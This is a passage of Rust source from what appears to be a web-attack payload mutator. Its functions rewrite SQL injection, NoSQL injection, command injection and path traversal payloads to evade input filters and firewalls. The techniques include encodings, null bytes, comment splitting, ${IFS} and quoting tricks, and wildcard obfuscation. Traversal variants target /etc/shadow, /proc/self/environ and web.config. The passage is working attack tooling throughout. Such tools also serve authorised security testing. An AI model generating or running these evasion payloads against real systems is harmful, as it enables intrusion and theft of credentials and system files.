}

fn mutator_encode_unicode_escape(payload: &str) -> Vec<String> {
    let unicode = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == ' ' {
                c.to_string()
            } else {
                format!("\\u{:04X}", c as u32)
            }
        })
        .collect::<String>();

    let iis_unicode = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                format!("%u{:04X}", c as u32)
            }
        })
        .collect::<String>();

    vec![unicode, iis_unicode]
}

fn mutator_encode_html_entities(payload: &str) -> Vec<String> {
    let html = payload
        .chars()
        .map(|c| match c {
            '<' => "&lt;".to_string(),
            '>' => "&gt;".to_string(),
            '"' => "&quot;".to_string(),
            '\'' => "&#39;".to_string(),
            '&' => "&amp;".to_string(),
            _ if !c.is_ascii_alphanumeric() && c != ' ' => format!("&#{};", c as u32),
            _ => c.to_string(),
        })
        .collect::<String>();

    let hex_html = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == ' ' {
                c.to_string()
            } else {
                format!("&#x{:X};", c as u32)
            }
        })
        .collect::<String>();

    vec![html, hex_html]
}

fn mutator_encode_hex(payload: &str) -> Vec<String> {
    let hex = payload
        .bytes()
        .map(|b| format!("\\x{:02x}", b))
        .collect::<String>();
    vec![hex]
}

fn mutator_encode_octal(payload: &str) -> Vec<String> {
    let octal = payload
        .bytes()
        .map(|b| format!("\\{:03o}", b))
        .collect::<String>();
    vec![octal]
}

fn mutator_encode_utf8_overlong(payload: &str) -> Vec<String> {
    let overlong = payload
        .chars()
        .map(|c| match c {
            '/' => "%c0%af".to_string(),
            '.' => "%c0%ae".to_string(),
            '\\' => "%c1%9c".to_string(),
            _ => c.to_string(),
        })
        .collect::<String>();

    let overlong2 = payload
        .chars()
        .map(|c| match c {
            '/' => "%e0%80%af".to_string(),
            '.' => "%e0%80%ae".to_string(),
            _ => c.to_string(),
        })
        .collect::<String>();

    vec![overlong, overlong2]
}

fn mutator_encode_mixed_partial(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let chars: Vec<char> = payload.chars().collect();
    let mut special_idx = 0;

    let mixed1: String = chars
        .iter()
        .map(|&c| {
            if !c.is_ascii_alphanumeric() && c != ' ' {
                special_idx += 1;
                if special_idx % 2 == 0 {
                    format!("%{:02X}", c as u8)
                } else {
                    c.to_string()
                }
            } else {
                c.to_string()
            }
        })
        .collect();
    results.push(mixed1);

    special_idx = 0;
    let mixed2: String = chars
        .iter()
        .map(|&c| {
            if !c.is_ascii_alphanumeric() && c != ' ' {
                special_idx += 1;
                if special_idx % 2 == 1 {
                    format!("%{:02X}", c as u8)
                } else {
                    c.to_string()
                }
            } else {
                c.to_string()
            }
        })
        .collect();
    results.push(mixed2);

    results
}

// --- Whitespace & Boundary Mutations ---

fn swap_whitespace(payload: &str) -> Vec<String> {
    let alternatives = ["\t", "%09", "%0a", "%0d", "%20", "/**/", "+", "%0b", "%0c"];
    let mut results = Vec::new();
    for alt in &alternatives {
        let swapped = payload.replace(' ', alt);
        if swapped != *payload {
            results.push(swapped);
        }
    }
    results
}

fn boundary_wrap(payload: &str) -> Vec<String> {
    vec![
        format!("%0a{}", payload),
        format!("%0d%0a{}", payload),
        format!("\n{}", payload),
        format!("\r\n{}", payload),
        format!("{}{}", "\x0c", payload),
        format!("{}{}", "\x0b", payload),
        format!(" {}", payload),
        format!("{}  ", payload),
    ]
}

fn null_byte_append(payload: &str) -> Vec<String> {
    vec![
        format!("{}%00", payload),
        format!("{}\x00", payload),
        format!("{}%00%00", payload),
        format!("%00{}", payload),
    ]
}

// --- SQL Injection Mutations ---

fn sql_comment_inject(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let chars: Vec<char> = payload.chars().collect();
    if chars.len() > 2 {
        for i in 1..chars.len() {
            if chars[i - 1].is_alphabetic() && chars[i].is_alphabetic() {
                let mut new = String::new();
                new.extend(&chars[..i]);
                new.push_str("/**/");
                new.extend(&chars[i..]);
                results.push(new);
            }
        }
    }

    let keywords = ["SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "ORDER", "INSERT", "UPDATE", "DELETE", "DROP"];
    let upper = payload.to_uppercase();
    for kw in &keywords {
        if upper.contains(kw) {
            if kw.len() >= 2 {
                let mid = kw.len() / 2;
                let split_kw = format!("{}/**/{}",  &kw[..mid], &kw[mid..]);
                results.push(replace_case_insensitive(payload, kw, &split_kw));
            }
        }
    }

    results.push(payload.replace("UNION", "/*!50000 UNION*/"));
    results.push(payload.replace("SELECT", "/*!50000 SELECT*/"));
    results.push(format!("{}-- ", payload));
    results.push(format!("{}#", payload));
    results.push(format!("{}--+-", payload));
    results.push(format!("{};--", payload));
    results.push(format!("{}/*", payload));

    results
}

fn sql_case_toggle(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let chars: Vec<char> = payload.chars().collect();

    let toggle1: String = chars
        .iter()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 { c.to_lowercase().to_string() }
            else { c.to_uppercase().to_string() }
        })
        .collect();
    results.push(toggle1);

    let toggle2: String = chars
        .iter()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 1 { c.to_lowercase().to_string() }
            else { c.to_uppercase().to_string() }
        })
        .collect();
    results.push(toggle2);

    let mut rng = rand::rng();
    let random_case: String = chars
        .iter()
        .map(|c| {
            if c.is_alphabetic() {
                let options = [true, false];
                if *options.choose(&mut rng).unwrap_or(&true) {
                    c.to_uppercase().to_string()
                } else {
                    c.to_lowercase().to_string()
                }
            } else {
                c.to_string()
            }
        })
        .collect();
    results.push(random_case);

    results
}

fn sql_concat_split(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    if payload.len() >= 4 {
        let mid = payload.len() / 2;
        results.push(format!("CONCAT('{}','{}')", &payload[..mid], &payload[mid..]));
        results.push(format!("'{}'+'{}'" , &payload[..mid], &payload[mid..]));
        results.push(format!("'{}'||'{}'", &payload[..mid], &payload[mid..]));
        if payload.len() <= 20 {
            let chr_str: String = payload
                .bytes()
                .map(|b| format!("CHR({})", b))
                .collect::<Vec<_>>()
                .join("||");
            results.push(chr_str);
        }
    }
    results
}

fn sql_version_comment(payload: &str) -> Vec<String> {
    let versions = ["50000", "50001", "40100", "40000", "99999"];
    versions
        .iter()
        .map(|v| format!("/*!{} {} */", v, payload))
        .collect()
}

fn sql_alternative_syntax(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let upper = payload.to_uppercase();

    if upper.contains("OR") {
        results.push(replace_case_insensitive(payload, "OR", "||"));
        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 2>1"));
        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 'a'='a'"));
        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 1 LIKE 1"));
        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 1 BETWEEN 0 AND 2"));
    }
    if upper.contains("AND") {
        results.push(replace_case_insensitive(payload, "AND", "&&"));
    }
    if upper.contains("=") {
        results.push(payload.replace('=', " LIKE "));
        results.push(payload.replace('=', " REGEXP "));
    }

    results
}

fn sql_hex_encode_strings(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    if payload.contains('\'') || payload.contains('"') {
        let hex_encoded = payload
            .chars()
            .map(|c| {
                if c == '\'' || c == '"' || c == ' ' {
                    c.to_string()
                } else if c.is_alphabetic() {
                    format!("0x{:02X}", c as u8)
                } else {
                    c.to_string()
                }
            })
            .collect::<String>();
        results.push(hex_encoded);
    }
    results
}

// --- NoSQL Injection Mutations ---

fn nosql_operator_variants(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let operators = [
        ("$ne", "$not"),
        ("$gt", "$gte"),
        ("$gt", "$nin"),
        ("$where", "$expr"),
        ("$ne", "$exists"),
    ];
    for (from, to) in &operators {
        if payload.contains(from) {
            results.push(payload.replace(from, to));
        }
    }
    results.push(format!("[{}]", payload));
    results.push(payload.replace("null", "[]"));
    results.push(payload.replace("null", "\"\""));
    results.push(payload.replace("null", "0"));
    results.push(payload.replace("true", "1"));
    results
}

fn nosql_unicode_escape(payload: &str) -> Vec<String> {
    let unicode = payload
        .chars()
        .map(|c| {
            if c == '$' || c == '.' || c == '{' || c == '}' {
                format!("\\u{:04X}", c as u32)
            } else {
                c.to_string()
            }
        })
        .collect::<String>();
    vec![unicode]
}

// --- Command Injection Mutations ---

fn cmd_separator_variants(payload: &str) -> Vec<String> {
    let separators = [";", "|", "||", "&&", "&", "\n", "\r\n", "%0a", "%0d%0a", "`", "$()"];
    let mut results = Vec::new();

    for sep in &separators {
        for orig in [";", "|", "&", "`"] {
            if payload.contains(orig) {
                results.push(payload.replacen(orig, sep, 1));
            }
        }
    }

    for sep in &separators {
        results.push(format!("{}{}", sep, payload.trim_start_matches(|c: char| c == ';' || c == '|' || c == '&' || c == ' ')));
    }

    results
}

fn cmd_variable_expansion(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    if payload.contains("id") {
        results.push(payload.replace("id", "${IFS}id"));
        results.push(payload.replace("id", "i${x}d"));
        results.push(payload.replace("id", "'i''d'"));
    }
    if payload.contains("cat") {
        results.push(payload.replace("cat", "c${x}at"));
        results.push(payload.replace("cat", "'c''a''t'"));
        results.push(payload.replace("cat", "c\\at"));
    }
    if payload.contains("passwd") {
        results.push(payload.replace("passwd", "pas${x}swd"));
        results.push(payload.replace("passwd", "p'a's's'w'd"));
    }
    results.push(payload.replace(' ', "${IFS}"));
    results.push(payload.replace(' ', "$IFS$9"));
    results.push(payload.replace(' ', "{,,}"));
    results.push(payload.replace(' ', "%20"));

    results
}

fn cmd_quoting_tricks(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let chars: Vec<char> = payload.chars().collect();
    if chars.len() > 2 {
        for i in 1..chars.len().saturating_sub(1) {
            if chars[i].is_alphabetic() && chars[i + 1].is_alphabetic() {
                let mut new = String::new();
                new.extend(&chars[..i + 1]);
                new.push_str("''");
                new.extend(&chars[i + 1..]);
                results.push(new);
                if results.len() >= 5 {
                    break;
                }
            }
        }
    }

    let backslashed: String = chars
        .iter()
        .enumerate()
        .map(|(i, c)| {
            if c.is_alphabetic() && i > 0 && i % 3 == 0 {
                format!("\\{}", c)
            } else {
                c.to_string()
            }
        })
        .collect();
    results.push(backslashed);

    results
}

fn cmd_wildcard_bypass(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    if payload.contains("/etc/passwd") {
        results.push(payload.replace("/etc/passwd", "/etc/pass??"));
        results.push(payload.replace("/etc/passwd", "/etc/pas*"));
        results.push(payload.replace("/etc/passwd", "/e?c/p?ss?d"));
    }
    if payload.contains("cat") {
        results.push(payload.replace("cat", "/bin/c?t"));
        results.push(payload.replace("cat", "/bin/ca*"));
    }
    results
}

// --- Path Traversal Mutations ---

fn traversal_encoding_variants(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let dot_dot_slash_encodings = [
        "../", "..\\",
        "..%2f", "..%5c",
        "%2e%2e/", "%2e%2e%2f",
        "%2e%2e\\", "%2e%2e%5c",
        "..%252f", "..%255c",
        "%252e%252e%252f",
        "%c0%ae%c0%ae/",
        "%c0%ae%c0%ae%c0%af",
        "%e0%80%ae%e0%80%ae/",
        "%e0%80%ae%e0%80%ae%e0%80%af",
        "..%c0%af",
        "..%ef%bc%8f",
        "．．／",
        "．．/",
        "..%u002f",
        "..%u005c",
        "....//",
        "..../",
        "..\\/",
        "..%00/",
        "..;/",
    ];

    for encoding in &dot_dot_slash_encodings {
        let rebuilt = payload
            .replace("../", encoding)
            .replace("..\\", encoding);
        if rebuilt != *payload {
            results.push(rebuilt);
        }
    }

    results
}

fn traversal_os_variants(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let linux_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/proc/self/environ", "/proc/self/cmdline",
        "/proc/1/cwd", "/var/log/auth.log",
        "/etc/issue", "/etc/motd",
    ];
    let windows_files = [
        "\\windows\\win.ini", "\\windows\\system.ini",
        "\\boot.ini", "\\inetpub\\wwwroot\\web.config",
        "\\windows\\system32\\drivers\\etc\\hosts",
    ];

    let prefix = extract_traversal_prefix(payload);
    for file in &linux_files {
        results.push(format!("{}{}", prefix, file));
    }
    for file in &windows_files {
        results.push(format!("{}{}", prefix.replace('/', "\\"), file));
    }
    results
}

fn traversal_null_extension(payload: &str) -> Vec<String> {
    let extensions = [".php", ".html", ".jsp", ".asp", ".aspx", ".txt", ".xml", ".json", ".log"];
    let mut results = Vec::new();
    for ext in &extensions {
        results.push(format!("{}%00{}", payload, ext));
        results.push(format!("{}\x00{}", payload, ext));
    }
    results.push(format!("{}%2500", payload));
    results
}

fn traversal_double_dot_variants(payload: &str) -> Vec<String> {
    let mut results = Vec::new();
    let patterns = [
        ("../", "....//"),
        ("../", "....\\\\//"),
        ("../", "..%00/"),
        ("../", "..%0d/"),
        ("../", "..%0a/"),
        ("../", ".%2e/"),
        ("../", "%2e./"),
        ("../", "..%09/"),
        ("../", "..;/"),
    ];
    for (from, to) in &patterns {
        let rebuilt = payload.replace(from, to);
        if rebuilt != *payload {
            results.push(rebuilt);
        }
    }
    results
}

fn expand_traversal_depths(seeds: &[String], config: &MutatorConfig) -> Vec<String> {
    let mut results = Vec::new();
    let target_files = [
        "etc/passwd", "etc/shadow", "etc/hosts",
        "proc/self/environ", "windows/win.ini", "windows/system.ini",
        "boot.ini",
    ];
    let separators = ["../", "..\\", "..%2f", "..%5c", "%2e%2e/", "%2e%2e%2f"];

    for depth in 1..=config.traversal_max_depth {
        for sep in &separators {
            let prefix = sep.repeat(depth);
            for file in &target_files {
                results.push(format!("{}{}", prefix, file));
            }
        }
    }

    for seed in seeds {
        if let Some(file) = extract_traversal_target(seed) {
            for depth in 1..=config.traversal_max_depth {
                results.push(format!("{}{}", "../".repeat(depth), file));
                results.push(format!("{}{}", "..\\".repeat(depth), file));
                results.push(format!("{}{}", "..%2f".repeat(depth), file));
            }
        }
    }

    results
}

// --- Mutator Utility Helpers ---

fn replace_case_insensitive(text: &str, from: &str, to: &str) -> String {
    let lower_text = text.to_lowercase();
    let lower_from = from.to_lowercase();
    if let Some(pos) = lower_text.find(&lower_from) {
        let mut result = String::new();
        result.push_str(&text[..pos]);
        result.push_str(to);
        result.push_str(&text[pos + from.len()..]);
        result
    } else {
        text.to_string()
    }
}

fn extract_traversal_prefix(payload: &str) -> String {
    let mut prefix = String::new();
    let mut chars = payload.chars().peekable();
    while chars.peek().is_some() {
        if payload[prefix.len()..].starts_with("../") {
            prefix.push_str("../");
            chars.nth(2);
        } else if payload[prefix.len()..].starts_with("..\\") {
            prefix.push_str("..\\");
            chars.nth(2);
        } else {
            break;
        }
    }
    if prefix.is_empty() {
        "../../../".to_string()
    } else {
        prefix
    }
}

fn extract_traversal_target(payload: &str) -> Option<String> {
    let cleaned = payload
        .replace("..\\", "../")
        .replace("..%2f", "../")
        .replace("..%5c", "../");
    if let Some(last_idx) = cleaned.rfind("../") {
        let target = &cleaned[last_idx + 3..];
        if !target.is_empty() {
            return Some(target.to_string());
        }
    }
    None
}

